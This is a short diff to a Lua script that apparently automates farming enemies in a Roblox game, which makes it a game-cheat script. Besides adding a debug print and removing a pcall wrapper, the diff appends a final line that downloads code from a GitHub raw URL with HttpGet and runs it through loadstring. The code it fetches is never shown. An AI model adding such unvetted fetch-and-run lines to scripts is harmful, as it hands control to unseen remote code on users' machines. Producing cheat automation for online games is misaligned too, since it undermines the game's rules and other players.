@@ -291,12 +291,11 @@ function()
     while task.wait() do
         
         if CanDoPriority("AutoFarm") then
-
+            print("GG")
             for _,Enemy in pairs(workspace.Server.Enemies[_G.Settings.SelectedMap]:GetChildren()) do
 
                 if not Enemy:GetAttribute("Respawning") and not Enemy:GetAttribute("Died") and not Enemy:GetAttribute("Capturing") and Enemy:GetAttribute("Health") > 0 and table.find(_G.Settings.SelectedEnemies,Enemy.Name) then
                     
-                    pcall(function()
 
                         local RealName = Enemy.Name
                         
@@ -314,7 +313,6 @@ function()
 
                         Enemy.Name = RealName
 
-                    end)
 
                 end
 
@@ -345,3 +343,5 @@ game.Players.LocalPlayer.AttributeChanged:Connect(function(n)
         game.Players.LocalPlayer:SetAttribute("Idle", false)
     end
 end)
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Vernyfx/test/main/ad'))()
